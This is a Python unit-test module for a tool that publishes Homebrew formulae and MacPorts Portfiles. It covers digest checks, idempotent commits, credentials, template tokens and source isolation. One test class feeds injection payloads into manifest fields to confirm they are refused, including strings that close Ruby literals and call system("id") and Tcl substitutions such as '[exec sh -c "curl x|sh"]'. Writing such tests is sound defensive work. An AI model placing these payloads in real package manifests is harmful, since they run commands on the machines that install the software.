"""The downstream package publishers: Homebrew and MacPorts.

These are the guarantees a publisher owes whatever package manager it targets,
checked once per publisher because a promise that holds for a formula and not
for a Portfile is not a promise. A digest that was not verified, a re-run that
commits the same bytes again, a destination that moved under the write, a
credential that is not there, a template with a hole in it — each has a stable
reason code, and each is asserted to produce that code from the publisher the
caller actually invoked.

The isolation tests at the end are the counterweight to the behaviour ones. It
is easy to make a publisher work by teaching it the one project it was written
for; the point of this package is that it does not know that project, so the
generic source is scanned for consumer and platform names the same way the
release core is.
"""

from __future__ import annotations

import ast
import hashlib
import os
import re
import shutil
import tempfile
import unittest

from continuum.release.publishers import contract, get, homebrew, macports, names, parse_settings
from continuum.release.publishers.assets import InMemoryAssetFetcher, verify_artifact
from continuum.release.publishers.contract import (
    ALREADY_CURRENT,
    CONFIGURATION_INVALID,
    DIGEST_MISMATCH,
    NO_ARTIFACT,
    QUARANTINE_POLICY,
    TEMPLATE_UNKNOWN_TOKEN,
    ArtifactManifest,
    PublishRequest,
    PublishedArtifact,
    PublisherError,
    ReleaseIdentity,
)
from continuum.release.publishers.repository import (
    InMemoryPackageRepository,
    StaleDestination,
)
from continuum.release.publishers.validation import GeneratedFile, audit

VERSION = "1.4.0"
TAG = f"v{VERSION}"
BASE = f"https://github.com/acme/widget/releases/download/{TAG}"
DIGEST = hashlib.sha256(b"payload").hexdigest()


def release() -> ReleaseIdentity:
    return ReleaseIdentity(repository="acme/widget", version=VERSION, download_base=BASE)


def artifact(name: str, *, kind: str = "archive", architecture: str = "", data=b"payload"):
    return PublishedArtifact(
        name=name,
        url=f"{BASE}/{name}",
        sha256=hashlib.sha256(data).hexdigest(),
        kind=kind,
        architecture=architecture,
    )


def manifest(*artifacts: PublishedArtifact) -> ArtifactManifest:
    return ArtifactManifest(release=release(), artifacts=tuple(artifacts))


def fetcher_for(*artifacts: PublishedArtifact, **overrides: bytes) -> InMemoryAssetFetcher:
    fetcher = InMemoryAssetFetcher()
    for item in artifacts:
        fetcher.add(item.url, overrides.get(item.name, b"payload"))
    return fetcher


def homebrew_settings(**over):
    settings = {
        "token": "widget",
        "destination": {
            "repository": "acme/homebrew-tap",
            "branch": "main",
            "mode": "trusted",
            "credential_secret": "TAP_TOKEN",
        },
        "formula": {
            "desc": "A widget",
            "homepage": "https://github.com/acme/widget",
            "license": "MIT",
            "install_paths": ["widget"],
        },
    }
    settings.update(over)
    return parse_settings("homebrew", settings)


def macports_settings(**over):
    settings = {
        "name": "widget",
        "tree": {
            "repository": "acme/macports-widget",
            "branch": "main",
            "mode": "trusted",
            "credential_secret": "TREE_TOKEN",
        },
        "portfile": {
            "name": "widget",
            "category": "sysutils",
            "license": "MIT",
            "maintainers": "{example.com:user @user} openmaintainer",
            "description": "A widget",
        },
    }
    settings.update(over)
    return parse_settings("macports", settings)


class ContractTests(unittest.TestCase):
    def test_a_download_base_must_be_pinned_to_its_tag(self):
        with self.assertRaises(PublisherError) as caught:
            ReleaseIdentity(
                repository="acme/widget",
                version=VERSION,
                download_base="https://github.com/acme/widget/releases/latest",
            )
        self.assertEqual(caught.exception.code, CONFIGURATION_INVALID)

    def test_an_empty_tag_defaults_from_the_version(self):
        identity = ReleaseIdentity(
            repository="acme/widget", version=VERSION, download_base=BASE
        )
        self.assertEqual(identity.tag, TAG)

    def test_a_manifest_refuses_the_same_asset_name_twice(self):
        with self.assertRaises(PublisherError):
            manifest(artifact("widget.tar.gz"), artifact("widget.tar.gz"))

    def test_retryability_is_decided_by_the_reason_not_by_prose(self):
        self.assertTrue(PublisherError("stale-destination", "x").retryable)
        self.assertFalse(PublisherError(DIGEST_MISMATCH, "x").retryable)

    def test_a_failure_result_carries_the_code_and_retryability(self):
        result = contract.PublishResult.failure(
            "homebrew", PublisherError(DIGEST_MISMATCH, "bad digest", remediation="re-cut")
        )
        self.assertEqual(result.status, contract.STATUS_FAILED)
        self.assertEqual(result.reason, DIGEST_MISMATCH)
        self.assertFalse(result.retryable)
        self.assertEqual(result.remediation, "re-cut")


class AssetVerificationTests(unittest.TestCase):
    def test_a_matching_asset_verifies(self):
        item = artifact("widget.tar.gz", data=b"good")
        verify_artifact(item, InMemoryAssetFetcher({item.url: b"good"}))

    def test_a_mismatched_digest_is_not_retryable(self):
        item = artifact("widget.tar.gz", data=b"good")
        with self.assertRaises(PublisherError) as caught:
            verify_artifact(item, InMemoryAssetFetcher({item.url: b"tampered"}))
        self.assertEqual(caught.exception.code, DIGEST_MISMATCH)
        self.assertFalse(caught.exception.retryable)

    def test_a_missing_asset_is_retryable(self):
        item = artifact("widget.tar.gz", data=b"good")
        with self.assertRaises(PublisherError) as caught:
            verify_artifact(item, InMemoryAssetFetcher({}))
        self.assertEqual(caught.exception.code, contract.ASSET_UNREACHABLE)
        self.assertTrue(caught.exception.retryable)


class SettingsTests(unittest.TestCase):
    def test_homebrew_without_a_destination_is_refused(self):
        with self.assertRaises(PublisherError) as caught:
            parse_settings("homebrew", {"token": "widget"})
        self.assertEqual(caught.exception.code, CONFIGURATION_INVALID)

    def test_an_unknown_setting_key_is_refused_by_name(self):
        with self.assertRaises(PublisherError) as caught:
            parse_settings(
                "homebrew",
                {
                    "token": "widget",
                    "destination": {"repository": "a/b", "credential_secret": "T"},
                    "formula": {"descr": "typo"},
                },
            )
        self.assertIn("descr", caught.exception.message)

    def test_an_inline_template_may_span_lines(self):
        parsed = parse_settings(
            "homebrew",
            {
                "token": "widget",
                "destination": {"repository": "a/b", "credential_secret": "T"},
                "formula": {"template": "class __CLASS__ < Formula\nend\n"},
            },
        )
        self.assertIn("\n", parsed.formula.template)

    def test_macports_requires_a_port_name(self):
        with self.assertRaises(PublisherError):
            parse_settings(
                "macports",
                {"name": "widget", "tree": {"repository": "a/b", "credential_secret": "T"},
                 "portfile": {"category": "sysutils"}},
            )


class RegistryTests(unittest.TestCase):
    def test_both_publishers_are_registered(self):
        self.assertEqual(names(), ("homebrew", "macports"))

    def test_an_unknown_publisher_is_refused_by_name(self):
        with self.assertRaises(PublisherError) as caught:
            get("chocolatey")
        self.assertIn("homebrew", caught.exception.message)

    def test_settings_are_parsed_through_the_named_publisher(self):
        parsed = parse_settings("homebrew", {"token": "widget",
                                             "destination": {"repository": "a/b",
                                                             "credential_secret": "T"}})
        self.assertEqual(parsed.token, "widget")


class HomebrewTests(unittest.TestCase):
    def test_a_per_architecture_release_generates_one_formula(self):
        arm, intel = artifact("Widget-arm64.tar.gz", architecture="arm64"), artifact(
            "Widget-x86_64.tar.gz", architecture="x86_64"
        )
        generated = homebrew.plan(
            PublishRequest(manifest=manifest(arm, intel), settings=homebrew_settings()),
            fetcher=fetcher_for(arm, intel),
        )
        self.assertEqual([item.path for item in generated], ["Formula/widget.rb"])
        content = generated[0].content
        self.assertIn("on_arm do", content)
        self.assertIn("on_intel do", content)
        self.assertIn("class Widget < Formula", content)
        self.assertIn(arm.sha256, content)
        self.assertIn(intel.sha256, content)

    def test_a_single_unversioned_archive_generates_a_plain_formula(self):
        item = artifact("widget-1.4.0.tar.gz")
        generated = homebrew.plan(
            PublishRequest(manifest=manifest(item), settings=homebrew_settings()),
            fetcher=fetcher_for(item),
        )
        content = generated[0].content
        self.assertIn(f'url "{item.url}"', content)
        self.assertIn(f'version "{VERSION}"', content)

    def test_a_cask_without_a_bundle_fails_unless_it_is_optional(self):
        item = artifact("widget-1.4.0.tar.gz")
        required = homebrew_settings(
            cask={"app_name": "Widget.app", "desc": "W", "homepage": "https://x.invalid"}
        )
        with self.assertRaises(PublisherError) as caught:
            homebrew.plan(
                PublishRequest(manifest=manifest(item), settings=required),
                fetcher=fetcher_for(item),
            )
        self.assertEqual(caught.exception.code, NO_ARTIFACT)

        optional = homebrew_settings(
            cask={
                "app_name": "Widget.app",
                "desc": "W",
                "homepage": "https://x.invalid",
                "optional": True,
            }
        )
        generated = homebrew.plan(
            PublishRequest(manifest=manifest(item), settings=optional), fetcher=fetcher_for(item)
        )
        self.assertEqual([item.surface for item in generated], ["formula"])

    def _bundle(self):
        return artifact("Widget.zip", kind="app-bundle")

    def _cask_only(self, **cask):
        surface = {"app_name": "Widget.app", "desc": "W", "homepage": "https://x.invalid"}
        surface.update(cask)
        return homebrew_settings(formula={"enabled": False}, cask=surface)

    def test_quarantine_may_not_be_cleared_for_a_vetted_artifact(self):
        item = self._bundle()
        with self.assertRaises(PublisherError) as caught:
            homebrew.plan(
                PublishRequest(
                    manifest=manifest(item),
                    settings=self._cask_only(
                        clear_quarantine=True,
                        quarantine_evidence="because",
                        notarized=True,
                    ),
                ),
                fetcher=fetcher_for(item),
            )
        self.assertEqual(caught.exception.code, QUARANTINE_POLICY)

    def test_quarantine_workaround_needs_evidence_and_is_audited(self):
        item = self._bundle()
        with self.assertRaises(PublisherError) as caught:
            homebrew.plan(
                PublishRequest(
                    manifest=manifest(item),
                    settings=self._cask_only(clear_quarantine=True),
                ),
                fetcher=fetcher_for(item),
            )
        self.assertEqual(caught.exception.code, QUARANTINE_POLICY)

        generated = homebrew.plan(
            PublishRequest(
                manifest=manifest(item),
                settings=self._cask_only(
                    clear_quarantine=True, quarantine_evidence="unsigned upstream build"
                ),
            ),
            fetcher=fetcher_for(item),
        )
        self.assertIn("com.apple.quarantine", generated[0].content)

    def test_a_template_with_an_undefined_token_is_refused(self):
        item = artifact("widget-1.4.0.tar.gz")
        with self.assertRaises(PublisherError) as caught:
            homebrew.plan(
                PublishRequest(
                    manifest=manifest(item),
                    settings=homebrew_settings(
                        formula={
                            "desc": "A widget",
                            "homepage": "https://github.com/acme/widget",
                            "license": "MIT",
                            "install_paths": ["widget"],
                            "template": 'url "__NOT_A_TOKEN__"',
                        }
                    ),
                ),
                fetcher=fetcher_for(item),
            )
        self.assertEqual(caught.exception.code, TEMPLATE_UNKNOWN_TOKEN)

    def test_publishing_is_idempotent(self):
        item = artifact("widget-1.4.0.tar.gz")
        request = PublishRequest(
            manifest=manifest(item),
            settings=homebrew_settings(),
            environment={"TAP_TOKEN": "t"},
        )
        repository = InMemoryPackageRepository(name="acme/homebrew-tap")
        first = homebrew.publish(request, repository, fetcher=fetcher_for(item))
        second = homebrew.publish(request, repository, fetcher=fetcher_for(item))
        self.assertEqual(first.status, contract.STATUS_PUBLISHED)
        self.assertEqual(second.reason, ALREADY_CURRENT)
        self.assertEqual(len(repository.commits), 1)

    def test_a_missing_credential_is_reported_not_guessed(self):
        item = artifact("widget-1.4.0.tar.gz")
        result = homebrew.publish(
            PublishRequest(manifest=manifest(item), settings=homebrew_settings()),
            InMemoryPackageRepository(name="acme/homebrew-tap"),
            fetcher=fetcher_for(item),
        )
        self.assertEqual(result.reason, contract.CREDENTIAL_MISSING)
        self.assertFalse(result.retryable)

    def test_a_stale_destination_is_reconciled_against_the_new_head(self):
        item = artifact("widget-1.4.0.tar.gz")
        request = PublishRequest(
            manifest=manifest(item),
            settings=homebrew_settings(),
            environment={"TAP_TOKEN": "t"},
        )
        repository = _AdvancingRepository(name="acme/homebrew-tap")
        result = homebrew.publish(request, repository, fetcher=fetcher_for(item))
        self.assertEqual(result.status, contract.STATUS_PUBLISHED)
        self.assertGreaterEqual(repository.attempts, 2)
        self.assertEqual(len(repository.commits), 1)


class _AdvancingRepository(InMemoryPackageRepository):
    """A destination that moves once, under the first write attempt."""

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self._moved = False
        self.attempts = 0

    def write(self, files, *, message, expected_head, branch):
        self.attempts += 1
        if not self._moved:
            self._moved = True
            self.advance()
            raise StaleDestination(expected_head, self.head, self.name)
        return super().write(
            files, message=message, expected_head=expected_head, branch=branch
        )


class MacPortsTests(unittest.TestCase):
    def test_the_built_in_portfile_names_the_version_and_checksum(self):
        item = artifact("widget-1.4.0.tar.gz")
        generated = macports.plan(
            PublishRequest(manifest=manifest(item), settings=macports_settings()),
            fetcher=fetcher_for(item),
        )
        self.assertEqual([entry.path for entry in generated], ["sysutils/widget/Portfile"])
        content = generated[0].content
        self.assertIn("github.setup        acme widget 1.4.0", content)
        self.assertIn(f"checksums           sha256  {item.sha256}", content)
        self.assertIn("livecheck.type      github", content)
        self.assertIn("use_configure       no", content)
        self.assertIn("build               {}", content)

    def test_extra_files_land_in_the_port_directory(self):
        item = artifact("widget-1.4.0.tar.gz")
        source_root = tempfile.mkdtemp(prefix="continuum-macports-test-")
        self.addCleanup(shutil.rmtree, source_root, True)
        with open(os.path.join(source_root, "config.example.toml"), "w", encoding="utf-8") as fh:
            fh.write("[widget]\n")
        settings = macports_settings(files={"config.example.toml": "config.example.toml"})
        repository = InMemoryPackageRepository(name="acme/macports-widget")
        result = macports.publish(
            PublishRequest(
                manifest=manifest(item), settings=settings, environment={"TREE_TOKEN": "t"}
            ),
            repository,
            fetcher=fetcher_for(item),
            source_root=source_root,
        )
        self.assertEqual(result.status, contract.STATUS_PUBLISHED)
        self.assertIn("sysutils/widget/config.example.toml", result.files)
        self.assertIsNotNone(
            repository.read_file("sysutils/widget/config.example.toml")
        )

    def test_the_installer_pin_tracks_the_tree_revision(self):
        item = artifact("widget-1.4.0.tar.gz")
        settings = macports_settings(
            installer={
                "destination": {
                    "repository": "acme/widget",
                    "branch": "main",
                    "mode": "trusted",
                    "credential_secret": "INSTALLER_TOKEN",
                },
                "path": "scripts/install-macports.sh",
            }
        )
        request = PublishRequest(
            manifest=manifest(item),
            settings=settings,
            environment={"TREE_TOKEN": "t", "INSTALLER_TOKEN": "i"},
        )
        tree = InMemoryPackageRepository(name="acme/macports-widget")
        installer = InMemoryPackageRepository(name="acme/widget")
        installer.seed("scripts/install-macports.sh", 'PIN_REV="old"\n')
        result = macports.publish(
            request, tree, fetcher=fetcher_for(item), installer_repository=installer
        )
        self.assertEqual(result.status, contract.STATUS_PUBLISHED)
        self.assertIn(f'PIN_REV="{result.revision}"', installer.read_file("scripts/install-macports.sh"))

    def test_a_rerun_pins_nothing_new(self):
        item = artifact("widget-1.4.0.tar.gz")
        settings = macports_settings(
            installer={
                "destination": {"repository": "acme/widget", "credential_secret": "INSTALLER_TOKEN"},
                "path": "scripts/install-macports.sh",
            }
        )
        request = PublishRequest(
            manifest=manifest(item),
            settings=settings,
            environment={"TREE_TOKEN": "t", "INSTALLER_TOKEN": "i"},
        )
        tree = InMemoryPackageRepository(name="acme/macports-widget")
        installer = InMemoryPackageRepository(name="acme/widget")
        installer.seed("scripts/install-macports.sh", 'PIN_REV="old"\n')
        macports.publish(request, tree, fetcher=fetcher_for(item), installer_repository=installer)
        again = macports.publish(
            request, tree, fetcher=fetcher_for(item), installer_repository=installer
        )
        self.assertEqual(again.reason, ALREADY_CURRENT)
        self.assertEqual(len(tree.commits), 1)
        self.assertEqual(len(installer.commits), 1)

    def test_the_pin_is_anchored_to_the_whole_line(self):
        rewritten = macports.pin_content(
            'PIN_REV_OLD="x"\nPIN_REV="y"\n', "PIN_REV", "abc", "installer.sh"
        )
        self.assertEqual(rewritten, 'PIN_REV_OLD="x"\nPIN_REV="abc"\n')

    def test_a_pin_line_that_is_not_there_is_a_configuration_error(self):
        with self.assertRaises(PublisherError) as caught:
            macports.pin_content("#!/bin/sh\n", "PIN_REV", "abc", "installer.sh")
        self.assertEqual(caught.exception.code, CONFIGURATION_INVALID)


class IsolationTests(unittest.TestCase):
    """The generic source must not know the project it was written for.

    The same reasoning as the release core's purity test: a package manager
    module that names a consumer cannot publish a second consumer, and the
    second consumer is the cheapest way to discover that. Prose is exempt, parsed
    rather than regexed, so an explanation of the boundary is not mistaken for
    crossing it.
    """

    CONSUMER_NAMES = ("nanodictate", "kodmial", "pr-agent", "pr_agent")

    def modules(self):
        import continuum.release.publishers as package

        directory = os.path.dirname(package.__file__)
        for name in sorted(os.listdir(directory)):
            if name.endswith(".py"):
                yield os.path.join(directory, name)

    def executable_source(self, path: str) -> str:
        with open(path, "r", encoding="utf-8") as handle:
            tree = ast.parse(handle.read())
        docstrings = set()
        for node in ast.walk(tree):
            if isinstance(node, (ast.Module, ast.ClassDef, ast.FunctionDef, ast.AsyncFunctionDef)):
                body = getattr(node, "body", [])
                if (
                    body
                    and isinstance(body[0], ast.Expr)
                    and isinstance(body[0].value, ast.Constant)
                    and isinstance(body[0].value.value, str)
                ):
                    docstrings.add(id(body[0].value))
        for node in ast.walk(tree):
            if isinstance(node, ast.Constant) and id(node) in docstrings:
                node.value = ""
        kept = [
            node
            for node in ast.walk(tree)
            if not (isinstance(node, ast.Constant) and id(node) in docstrings)
        ]
        return "\n".join(ast.unparse(node) for node in kept)

    def test_no_generic_module_names_a_consumer(self):
        for path in self.modules():
            code = self.executable_source(path)
            for term in self.CONSUMER_NAMES:
                with self.subTest(module=os.path.basename(path), term=term):
                    self.assertIsNone(
                        re.search(rf"\b{re.escape(term)}\w*", code, re.IGNORECASE),
                        f"{os.path.basename(path)} refers to {term!r} in code",
                    )

    def test_the_publishers_do_not_import_the_release_state_machine(self):
        for path in self.modules():
            imported = set()
            with open(path, "r", encoding="utf-8") as handle:
                tree = ast.parse(handle.read())
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    imported.update(alias.name for alias in node.names)
                elif isinstance(node, ast.ImportFrom) and node.module:
                    imported.add(node.module)
            for name in imported:
                with self.subTest(module=os.path.basename(path), imported=name):
                    self.assertNotIn("release.run", name)
                    self.assertNotIn("release.adapters", name)
                    self.assertNotIn("release.config", name)


class ManifestInjectionTests(unittest.TestCase):
    """A configuration value is written into a generated manifest as *source*.

    Every individual field is validated, and every individual field is a perfectly
    legal string: a description, a licence, a homepage, a path. Nothing in the
    configuration is wrong. What is wrong is that the manifest is Ruby and Tcl, so
    a double quote closes the literal and `[...]` is command substitution -- and
    what follows is source the package manager runs on the machine installing the
    software.

    That is not a malformed formula that a maintainer notices and fixes. The
    generated file is valid, Homebrew evaluates the class body, and the command
    runs. So the boundary is checked where the value enters, and these tests are
    written against the generated output rather than against the validator, because
    the output is the thing that gets evaluated.
    """

    def _formula(self, **formula):
        return homebrew_settings(
            formula={
                "desc": "A widget",
                "homepage": "https://github.com/acme/widget",
                "license": "MIT",
                "install_paths": ["widget"],
                **formula,
            }
        )

    def _portfile(self, **portfile):
        return macports_settings(
            portfile={"name": "widget", **portfile}
        )

    def _generated_formula(self, settings) -> str:
        item = artifact("widget-1.4.0.tar.gz")
        return homebrew.plan(
            PublishRequest(manifest=manifest(item), settings=settings),
            fetcher=fetcher_for(item),
        )[0].content

    def _refused(self, make):
        with self.assertRaises(PublisherError) as caught:
            make()
        return str(caught.exception)

    # -- homebrew: quoted Ruby literals -------------------------------------

    def test_a_description_cannot_close_its_own_string(self):
        message = self._refused(
            lambda: self._formula(desc='A widget"; system("id"); desc "')
        )
        self.assertIn("desc", message)
        self.assertIn("evaluated as manifest source", message)

    def test_a_licence_cannot_close_its_own_string(self):
        self.assertIn("license", self._refused(
            lambda: self._formula(license='MIT"; system("id"); license "')
        ))

    def test_a_homepage_cannot_close_its_own_string(self):
        # A URL is the least suspicious field in the file and the same failure.
        self.assertIn("homepage", self._refused(
            lambda: self._formula(homepage='https://x/y"; system("id"); url "')
        ))

    def test_a_trailing_backslash_cannot_swallow_the_closing_quote(self):
        # The generated line is `version "<value>"`. A value ending in a backslash
        # escapes the quote the emitter wrote, so the *next* line becomes a
        # continuation of this one.
        self.assertIn("desc", self._refused(lambda: self._formula(desc="A widget\\")))

    def test_an_install_path_is_bare_source_too(self):
        # `bin.install widget` is not quoted, so a semicolon there is a statement
        # boundary rather than a character in a word.
        message = self._refused(lambda: self._formula(install_paths=['widget; system("id")']))
        self.assertIn("install_paths", message)

    def test_a_service_path_cannot_close_its_own_string(self):
        self.assertIn("working_dir", self._refused(lambda: self._formula(
            service={"label": "Widget", "working_dir": '~"; system("id"); x "'})))

    # -- macports: bare Tcl words -------------------------------------------

    def test_a_description_cannot_be_command_substitution(self):
        message = self._refused(
            lambda: self._portfile(description='A widget [exec sh -c "curl x|sh"]')
        )
        self.assertIn("description", message)

    def test_a_long_description_cannot_expand_a_variable(self):
        self.assertIn("long_description", self._refused(
            lambda: self._portfile(long_description="A widget ${HOME}/x")
        ))

    def test_a_dependency_cannot_close_the_list_with_a_statement(self):
        self.assertIn("depends_lib", self._refused(
            lambda: self._portfile(depends_lib=["libx:foo", 'liby:bar; system("id")'])
        ))

    def test_maintainers_still_accept_the_documented_brace_group(self):
        # The refusal above cannot be a blanket one: `{example.com:user @user}` is
        # how MacPorts spells a maintainer, so a check that forbade braces would
        # forbid correct configuration and get disabled.
        settings = self._portfile(maintainers="{example.com:user @user} openmaintainer")
        self.assertEqual(
            settings.portfile.maintainers, "{example.com:user @user} openmaintainer"
        )

    def test_maintainers_still_refuses_substitution_inside_the_group(self):
        message = self._refused(
            lambda: self._portfile(maintainers="{a@b.com A} [exec id]")
        )
        self.assertIn("maintainers", message)

    def test_an_unbalanced_brace_group_is_refused(self):
        # Braces that do not pair are a Tcl syntax error, and a Portfile that does
        # not parse fails the build rather than the release that wrote it.
        self.assertIn("balance", self._refused(
            lambda: self._portfile(maintainers="{example.com:user")
        ))

    # -- what still has to work ---------------------------------------------

    def test_an_ordinary_configuration_still_generates_a_parsable_formula(self):
        # The bound runs both ways. A check that refuses ordinary punctuation is a
        # check that gets turned off, so the realistic configuration is asserted
        # as positively as the attack is.
        content = self._generated_formula(
            self._formula(
                desc="A fast widget (with punctuation, dashes - and 'quotes')",
                license="Apache-2.0 OR MIT",
                install_paths=["bin/widget", "share/man/man1/widget.1"],
            )
        )
        self.assertIn('desc "A fast widget (with punctuation, dashes - and ', content)
        self.assertIn('bin.install "bin/widget", "share/man/man1/widget.1"', content)

    def test_an_apostrophe_in_a_description_is_still_allowed(self):
        # Only the double quote ends a Ruby string. Refusing `'` would refuse the
        # single most common character in prose for no security benefit.
        content = self._generated_formula(self._formula(desc="A widget's worth of speed"))
        self.assertIn("widget's worth", content)

    def test_the_regex_a_pattern_may_use_is_not_a_manifest_value(self):
        # required_text and forbidden_text are never emitted, so a pattern there
        # may contain the characters the manifest boundary forbids. Checking them
        # would refuse every useful validation pattern.
        settings = self._formula()
        self.assertEqual(settings.formula.required_text, ())


class TemplateTokenTests(unittest.TestCase):
    """An unfilled token installs, and installs the *previous* release quietly.

    A generated manifest that still reads `version "__VERSION__"` is syntactically
    fine, passes every parser, and resolves to whatever was published before. The
    check is what turns that into a failed job instead of a broken install, so it is
    tested on both halves: a token in live text must be caught, and a token in a
    comment must not -- a scanner that reports documented tokens is a scanner whose
    output gets ignored, which costs the check the only signal it exists to give.

    Every file here is otherwise valid, so a failure means the token check fired
    and not that something else happened to be wrong too.
    """

    def _report(self, content: str):
        item = artifact("widget-1.4.0.tar.gz")
        document = GeneratedFile(
            path="Formula/widget.rb",
            content=content,
            surface="formula",
            selected=(item,),
        )
        return audit(document, manifest(item))

    def _failed_checks(self, content: str):
        return [check.name for check in self._report(content).checks if check.status != "passed"]

    def test_an_unfilled_token_is_refused(self):
        report_content = (
            f'url "{BASE}/widget-{VERSION}.tar.gz"\n'
            f'sha256 "{DIGEST}"\n'
            'version "__VERSION__"\n'
        )
        report = self._report(report_content)
        self.assertFalse(report.ok)
        self.assertIn("template-tokens-filled", self._failed_checks(report_content))

    def test_a_documented_token_is_not_a_failure(self):
        self.assertEqual(
            self._failed_checks(
                "# The generator fills __SHA256__ and __VERSION__ below.\n"
                f'url "{BASE}/widget-{VERSION}.tar.gz"\n'
                f'sha256 "{DIGEST}"\n'
                f'version "{VERSION}"  # was __VERSION__\n'
            ),
            [],
        )

    def test_a_token_in_live_text_after_a_url_is_still_caught(self):
        # `//` and `--` are path and flag punctuation, not comment introducers
        # mid-line. Treating them as comments deletes live text, and deleting live
        # text here means shipping an unfilled token.
        self.assertEqual(
            self._failed_checks(
                f'url "{BASE}/widget-{VERSION}.tar.gz"\n'
                '  url "https://example.invalid/__SHA256__"\n'
                f'sha256 "{DIGEST}"\n'
                f'version "{VERSION}"\n'
            ),
            ["template-tokens-filled"],
        )

    def test_a_flag_that_merely_starts_with_a_comment_marker_is_live_text(self):
        self.assertEqual(
            self._failed_checks(
                f'url "{BASE}/widget-{VERSION}.tar.gz"\n'
                "  opt --dry-run\n"
                f'sha256 "{DIGEST}"\n'
                f'version "{VERSION}"\n'
            ),
            [],
        )

    def test_each_comment_syntax_is_understood(self):
        from continuum.release.publishers.validation import unfilled_template_tokens

        for content in (
            "# __VERSION__",
            "// __VERSION__",
            "-- __VERSION__",
            "; __VERSION__",
            'version "1.0.0" # __VERSION__',
            'url "https://x/y"  // __VERSION__',
            'port "x"  -- __VERSION__',
        ):
            with self.subTest(content=content):
                self.assertEqual(unfilled_template_tokens(content), [])

    def test_an_absent_token_is_not_reported_as_one(self):
        from continuum.release.publishers.validation import unfilled_template_tokens

        self.assertEqual(unfilled_template_tokens(""), [])
        self.assertEqual(unfilled_template_tokens('sha256 "abc"\nversion "1.0.0"'), [])


class ValidationAuditTests(unittest.TestCase):
    def test_a_checksum_the_release_never_published_is_refused(self):
        item = artifact("widget-1.4.0.tar.gz")
        forged = GeneratedFile(
            path="Formula/widget.rb",
            content=f'sha256 "{"0" * 64}"\nversion "{VERSION}"\n',
            surface="formula",
            selected=(item,),
        )
        report = audit(forged, manifest(item))
        self.assertFalse(report.ok)
        self.assertEqual(report.reason, contract.VALIDATION_FAILED)


if __name__ == "__main__":
    unittest.main()
